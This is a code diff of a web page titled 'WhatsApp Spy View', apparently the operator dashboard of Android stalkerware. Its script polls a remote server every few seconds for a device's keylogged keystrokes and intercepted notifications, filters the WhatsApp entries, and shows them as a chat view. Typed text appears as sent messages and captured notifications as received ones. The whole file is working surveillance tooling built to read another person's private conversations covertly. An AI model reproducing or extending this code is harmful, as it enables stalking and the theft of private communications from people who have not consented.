@@ -3,333 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web (Live Sync)</title>
+    <title>WhatsApp Spy View</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- CSS STYLES --- */
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
-
-        /* Left Sidebar */
-        .sidebar { width: 350px; background-color: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; height: 100%; transition: all 0.3s ease; }
-        .header { background-color: #202c33; padding: 15px; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; color: #aebac1; }
+        body { margin: 0; font-family: sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
+        .sidebar { width: 300px; background: #202c33; border-right: 1px solid #374045; overflow-y: auto; }
+        .chat-area { flex: 1; background: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; display: flex; flex-direction: column; }
         
-        .contact-list { flex: 1; overflow-y: auto; }
+        .contact { padding: 15px; border-bottom: 1px solid #2a3942; cursor: pointer; display: flex; align-items: center; }
+        .contact:hover, .contact.active { background: #2a3942; }
+        .avatar { width: 40px; height: 40px; background: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px; font-weight: bold; }
         
-        /* Contact Item Styling */
-        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; height: 50px; } 
-        .contact:hover { background-color: #2a3942; }
-        .contact.active { background-color: #2a3942; }
-
-        .avatar { width: 45px; height: 45px; background-color: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 15px; flex-shrink: 0; font-size: 18px; font-weight: bold; }
-        .info { flex: 1; display: flex; align-items: center; }
-        .name { font-size: 17px; color: #e9edef; font-weight: 500; }
-
-        /* Right Chat Area */
-        .chat-area { flex: 1; display: flex; flex-direction: column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; position: relative; }
+        .header { padding: 10px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; }
+        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 5px; }
         
-        .chat-header { background-color: #202c33; padding: 10px 15px; display: flex; align-items: center; border-bottom: 1px solid #374045; }
+        /* BUBBLES */
+        .msg { max-width: 70%; padding: 8px 12px; border-radius: 8px; font-size: 14px; position: relative; word-wrap: break-word; }
         
-        .mobile-back { display: none; margin-right: 15px; font-size: 20px; color: #aebac1; cursor: pointer; }
-
-        .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; }
+        /* INCOMING (Left) */
+        .msg.incoming { background: #202c33; align-self: flex-start; border-top-left-radius: 0; }
         
-        /* MESSAGE BUBBLES */
-        .msg { 
-            max-width: 65%; 
-            padding: 6px 10px; 
-            border-radius: 8px; 
-            font-size: 14.5px; 
-            line-height: 1.4; 
-            word-wrap: break-word; 
-            color: #e9edef; 
-            position: relative; 
-            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
-            margin-bottom: 2px;
-        }
+        /* OUTGOING (Right) */
+        .msg.outgoing { background: #005c4b; align-self: flex-end; border-top-right-radius: 0; }
         
-        /* Incoming (Left) */
-        .msg.incoming {
-            background-color: #202c33;
-            align-self: flex-start;
-            border-top-left-radius: 0;
-        }
+        .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 5px; }
 
-        /* Outgoing (Right) */
-        .msg.outgoing {
-            background-color: #005c4b; /* WhatsApp Green */
-            align-self: flex-end;
-            border-top-right-radius: 0;
-        }
-        
-        .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 6px; }
-
-        .welcome-screen { position: absolute; top:0; left:0; width:100%; height:100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #222e35; z-index: 5; text-align: center; }
-
-        /* --- MOBILE RESPONSIVE --- */
-        @media (max-width: 768px) {
-            .sidebar { width: 100%; position: absolute; z-index: 20; }
-            .chat-area { width: 100%; position: absolute; z-index: 10; display: none; } 
-            
-            .mobile-back { display: block; }
-            .welcome-screen { display: none; }
-
-            body.chat-active .sidebar { display: none; }
-            body.chat-active .chat-area { display: flex; }
+        @media(max-width: 768px) {
+            .sidebar { width: 100%; position: absolute; z-index: 2; height: 100%; }
+            .chat-area { width: 100%; position: absolute; z-index: 1; }
+            .sidebar.hidden { display: none; }
         }
     </style>
 </head>
 <body>
 
     <div class="sidebar" id="sidebar">
-        <div class="header">
-            <span>Chats</span>
-            <div style="display:flex; gap:15px;">
-                <i class="fas fa-trash" onclick="clearData()" style="cursor:pointer; font-size:14px;" title="Clear Saved Data"></i>
-                <i class="fas fa-sync-alt" onclick="fetchData()" style="cursor:pointer;" title="Refresh"></i>
-            </div>
-        </div>
-        <div class="contact-list" id="contactList">
-            <div style="text-align:center; padding:20px; color:#8696a0;">Loading...</div>
-        </div>
+        <div style="padding:15px; font-weight:bold; color:#00a884;">CHATS (Live)</div>
+        <div id="contactList">Loading...</div>
     </div>
 
-    <div class="chat-area" id="chatArea">
-        <div class="welcome-screen" id="welcomeScreen">
-            <i class="fab fa-whatsapp" style="font-size: 60px; color: #3d4a51; margin-bottom: 20px;"></i>
-            <div style="font-size: 24px;">WhatsApp Web</div>
-            <div style="font-size: 14px; color: #8696a0; margin-top: 10px;">End-to-end encrypted locally</div>
+    <div class="chat-area">
+        <div class="header" id="chatHeader" style="display:none;">
+            <i class="fas fa-arrow-left" onclick="toggleSidebar()" style="margin-right:10px; cursor:pointer;"></i>
+            <span id="chatTitle">Select a Chat</span>
         </div>
-
-        <div class="chat-header" id="chatHeader" style="display:none;">
-            <i class="fas fa-arrow-left mobile-back" onclick="closeChat()"></i>
-            <div class="avatar" id="headerAvatar" style="width: 35px; height: 35px; font-size: 14px;"></div>
-            <div style="font-size: 16px; font-weight: 500;" id="headerName">Name</div>
-        </div>
-
-        <div class="messages" id="messageBox"></div>
+        <div class="messages" id="msgBox"></div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
-        
-        // TWO APIs: One for Incoming (Notifs), One for Outgoing (Keylogs)
-        const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
         const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
-        
-        const STORAGE_KEY = `whatsapp_merged_${deviceId || 'default'}`;
+        const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
 
-        let groupedChats = {};
-        let activeChatUser = null; 
+        let allChats = {}; 
+        let currentChatUser = null;
 
-        // 1. Load Data from LocalStorage
-        function loadFromStorage() {
-            const savedData = localStorage.getItem(STORAGE_KEY);
-            if (savedData) {
-                groupedChats = JSON.parse(savedData);
-                renderSidebar();
-                console.log("Loaded from Storage");
-            }
-        }
-
-        // 2. Fetch Both Data Sources & Merge
-        async function fetchData() {
+        async function syncData() {
             if (!deviceId) return;
+
             try {
-                // Fetch both at the same time
-                const [resNotifs, resLogs] = await Promise.all([
-                    fetch(API_NOTIFS).then(res => res.json()).catch(() => []),
-                    fetch(API_KEYLOGS).then(res => res.json()).catch(() => [])
+                // DONO APIs se data mangao
+                const [logs, notifs] = await Promise.all([
+                    fetch(API_KEYLOGS).then(r => r.json()).catch(()=>[]),
+                    fetch(API_NOTIFS).then(r => r.json()).catch(()=>[])
                 ]);
 
-                // Normalize & Tag Data
-                let allMessages = [];
-
-                // Process Notifications (Incoming)
-                resNotifs.forEach(item => {
-                    if ((item.packageName || "").includes("whatsapp") || (item.appName || "").toLowerCase() === "whatsapp") {
-                        allMessages.push({
-                            type: 'incoming', // Left Side
-                            title: item.title,
-                            text: item.text,
-                            time: item.postTime || item.timestamp || Date.now() // Fallback time
-                        });
+                // DATA PROCESSING
+                logs.forEach(item => {
+                    // Agar Android se 'type' outgoing_keylog hai -> RIGHT SIDE
+                    if (item.type === 'outgoing_keylog' || item.appName === 'WhatsApp') {
+                        addMsg(item.title || "Unknown", item.text, item.timestamp, 'outgoing');
+                    }
+                    // Agar Android se 'type' incoming_screen hai -> LEFT SIDE
+                    else if (item.type === 'incoming_screen') {
+                        addMsg(item.title || "Unknown", item.text, item.timestamp, 'incoming');
                     }
                 });
 
-                // Process Keylogs (Outgoing)
-                resLogs.forEach(item => {
-                    // Keylogs usually don't have packageName, but appName is sent from our Android code
-                    if ((item.appName || "").toLowerCase() === "whatsapp") {
-                        allMessages.push({
-                            type: 'outgoing', // Right Side
-                            title: item.title, // Contact Name from Android Code
-                            text: item.text,
-                            time: item.timestamp || Date.now()
-                        });
+                // NOTIFICATIONS (Backup Incoming)
+                notifs.forEach(item => {
+                    if(item.packageName && item.packageName.includes('whatsapp')) {
+                        addMsg(item.title, item.text, item.timestamp, 'incoming');
                     }
                 });
 
-                processChats(allMessages);
+                renderContacts();
+                if(currentChatUser) renderMessages(currentChatUser);
 
-            } catch (e) { console.error("Sync Error:", e); }
+            } catch(e) { console.log(e); }
         }
 
-        // 3. Process, Group & Save
-        function processChats(data) {
-            let tempGrouped = {}; 
-            
-            data.forEach(msg => {
-                const name = msg.title || "Unknown";
-                if (!tempGrouped[name]) tempGrouped[name] = [];
-                tempGrouped[name].push(msg);
-            });
+        function addMsg(user, text, time, type) {
+            if(!user || !text) return;
+            if(!allChats[user]) allChats[user] = [];
 
-            // Clean Duplicates & Sort Each Chat
-            for (let name in tempGrouped) {
-                // Filter Duplicates logic
-                let unique = [];
-                let seen = new Set();
-                
-                // Sort by Time (Oldest First for Display)
-                tempGrouped[name].sort((a, b) => a.time - b.time);
-
-                tempGrouped[name].forEach(msg => {
-                    // Create a unique key to prevent duplicate lines
-                    const uniqueKey = `${msg.type}-${msg.text}-${msg.time}`;
-                    if (!seen.has(uniqueKey)) {
-                        seen.add(uniqueKey);
-                        unique.push(msg);
-                    }
-                });
-                tempGrouped[name] = unique;
-            }
-
-            if (Object.keys(tempGrouped).length > 0) {
-                groupedChats = tempGrouped;
-                localStorage.setItem(STORAGE_KEY, JSON.stringify(groupedChats));
-            }
-
-            renderSidebar();
-            if (activeChatUser) {
-                renderMessages(activeChatUser, true); 
+            // Duplicate Check
+            const exists = allChats[user].some(m => m.text === text && Math.abs(m.time - time) < 5000);
+            if(!exists) {
+                allChats[user].push({ text, time, type });
+                // Sort by time
+                allChats[user].sort((a,b) => a.time - b.time);
             }
         }
 
-        // 4. Render Sidebar (Sorted by Last Message Time)
-        function renderSidebar() {
+        function renderContacts() {
             const list = document.getElementById('contactList');
             list.innerHTML = "";
-            
-            const sortedNames = Object.keys(groupedChats).sort((a, b) => {
-                const msgsA = groupedChats[a];
-                const msgsB = groupedChats[b];
-                const timeA = msgsA[msgsA.length - 1]?.time || 0;
-                const timeB = msgsB[msgsB.length - 1]?.time || 0;
-                return timeB - timeA; // Newest first
-            });
-
-            if (sortedNames.length === 0) {
-                list.innerHTML = `<div style="text-align:center; padding:20px; color:#8696a0;">No chats found</div>`;
-                return;
-            }
-
-            sortedNames.forEach(name => {
-                const msgs = groupedChats[name];
-                const lastMsg = msgs[msgs.length - 1];
-                
+            Object.keys(allChats).forEach(user => {
                 const div = document.createElement('div');
-                div.className = 'contact';
-                if (name === activeChatUser) div.classList.add('active');
-                
-                div.onclick = () => openChat(name);
-                
-                div.innerHTML = `
-                    <div class="avatar">${name.charAt(0).toUpperCase()}</div>
-                    <div class="info">
-                        <div style="width:100%;">
-                            <div style="display:flex; justify-content:space-between;">
-                                <div class="name">${name}</div>
-                                <div style="font-size:11px; color:#8696a0;">${new Date(parseInt(lastMsg.time)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>
-                            </div>
-                            <div style="font-size:13px; color:#8696a0; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; margin-top:3px;">
-                                ${lastMsg.type === 'outgoing' ? '<i class="fas fa-check-double" style="color:#53bdeb; font-size:10px;"></i> ' : ''}${lastMsg.text}
-                            </div>
-                        </div>
-                    </div>
-                `;
+                div.className = `contact ${currentChatUser === user ? 'active' : ''}`;
+                div.onclick = () => openChat(user);
+                div.innerHTML = `<div class="avatar">${user[0]}</div> <div>${user}</div>`;
                 list.appendChild(div);
             });
         }
 
-        function openChat(name) {
-            activeChatUser = name;
-            document.body.classList.add('chat-active');
-            document.getElementById('welcomeScreen').style.display = 'none';
+        function openChat(user) {
+            currentChatUser = user;
+            document.getElementById('chatTitle').innerText = user;
             document.getElementById('chatHeader').style.display = 'flex';
-            document.getElementById('headerName').innerText = name;
-            document.getElementById('headerAvatar').innerText = name.charAt(0).toUpperCase();
-            renderSidebar(); 
-            renderMessages(name, false); 
-        }
-
-        function renderMessages(name, isAutoRefresh) {
-            const box = document.getElementById('messageBox');
-            // Check if user is at bottom BEFORE updating
-            const isScrolledToBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 100;
-
-            if (!groupedChats[name]) return;
-
-            // Messages are already sorted by time in processChats
-            let msgs = groupedChats[name];
             
-            let htmlContent = "";
-            let lastDate = "";
+            // Mobile toggle
+            if(window.innerWidth < 768) document.getElementById('sidebar').classList.add('hidden');
+            
+            renderMessages(user);
+        }
 
-            msgs.forEach(msg => {
-                // Optional: Add Date Dividers (Today, Yesterday)
-                const msgDate = new Date(parseInt(msg.time)).toLocaleDateString();
-                if(msgDate !== lastDate) {
-                    htmlContent += `<div style="text-align:center; padding:10px; font-size:12px; color:#8696a0; background-color:transparent;"><span style="background:#202c33; padding:5px 12px; border-radius:10px;">${msgDate}</span></div>`;
-                    lastDate = msgDate;
-                }
-
-                // Determine Class (Incoming vs Outgoing)
-                const msgClass = msg.type === 'outgoing' ? 'outgoing' : 'incoming';
-
-                htmlContent += `
-                    <div class="msg ${msgClass}">
-                        ${msg.text} 
-                        <span class="time">${new Date(parseInt(msg.time)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
-                    </div>`;
+        function renderMessages(user) {
+            const box = document.getElementById('msgBox');
+            box.innerHTML = "";
+            const msgs = allChats[user] || [];
+            
+            msgs.forEach(m => {
+                const div = document.createElement('div');
+                div.className = `msg ${m.type}`;
+                const timeStr = new Date(m.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+                div.innerHTML = `${m.text} <span class="time">${timeStr}</span>`;
+                box.appendChild(div);
             });
-
-            box.innerHTML = htmlContent;
-
-            // Scroll to bottom only if user was already at bottom or just opened chat
-            if (!isAutoRefresh || isScrolledToBottom) {
-                box.scrollTop = box.scrollHeight;
-            }
+            box.scrollTop = box.scrollHeight;
         }
 
-        function closeChat() {
-            activeChatUser = null;
-            document.body.classList.remove('chat-active');
-            renderSidebar();
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.remove('hidden');
         }
 
-        function clearData() {
-            if(confirm("Delete all saved chat history?")) {
-                localStorage.removeItem(STORAGE_KEY);
-                location.reload();
-            }
-        }
-
-        // --- STARTUP LOGIC ---
-        loadFromStorage();
-        fetchData();
-        setInterval(fetchData, 2000); // 3 seconds refresh
-
+        setInterval(syncData, 3000); // 3 sec refresh
+        syncData();
     </script>
 </body>
 </html>
